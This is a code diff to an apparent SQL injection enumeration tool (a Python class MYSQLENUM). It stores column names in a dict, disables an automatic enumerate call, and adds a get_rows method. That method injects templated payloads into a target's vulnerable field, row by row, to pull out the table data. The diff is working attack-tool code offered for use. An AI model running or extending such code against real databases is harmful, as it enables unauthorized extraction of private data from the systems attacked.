@@ -87,7 +87,7 @@ class MYSQLENUM():
         
         self.DB = {}
         
-        self.enumerate()
+        # self.enumerate()
         
 
     def get_fd(self):
@@ -224,8 +224,8 @@ class MYSQLENUM():
             
     def get_cols(self, col_count, table):
         '''Retrieve the list of columns names in a table'''
-        
-        cols_list = []
+
+        cols_list = {}
         
         enum_logger.info("Enumerated column: '{}' ... ".format(table))
         
@@ -240,10 +240,41 @@ class MYSQLENUM():
             col = self.send_sqli()
             
             prog_bar.set_description("Column: '{}'".format(clr.red(col)))
-            
-            cols_list.append(col)
+
+            cols_list[col] = None
             
         return cols_list
+
+    def get_rows(self, col_name, table_name, limit=None):
+        '''Retrieve the list of rows for a particular column in a table'''
+        
+        row_list = []
+        
+        enum_logger.info("Enumerating rows for table: '{}', column: '{}' ... ".format(table_name, col_name))
+
+        if limit:
+
+            prog_bar = trange(limit)
+            
+        else:
+            
+            prog_bar = trange(int(self.DB['tables'][table_name]['row_count']))
+            
+        
+        for i in prog_bar:
+            
+            live_enum_pl = self.sqli.replace(self.payload_delimiter,self.enum_rows_pl.format(table_name=table_name, col_name=col_name)+self.limits.replace("~num~",str(i)))
+            
+            self.data[self.vuln_field] = live_enum_pl
+
+            row = self.send_sqli()
+            
+            prog_bar.set_description("Enumerated row data: '{}'".format(clr.red(row)))
+            
+            row_list.append(row)
+            
+        return row_list
+
              
     def send_sqli(self):
         '''Send the SQL query+payload to be executed on the target via SQL injection'''
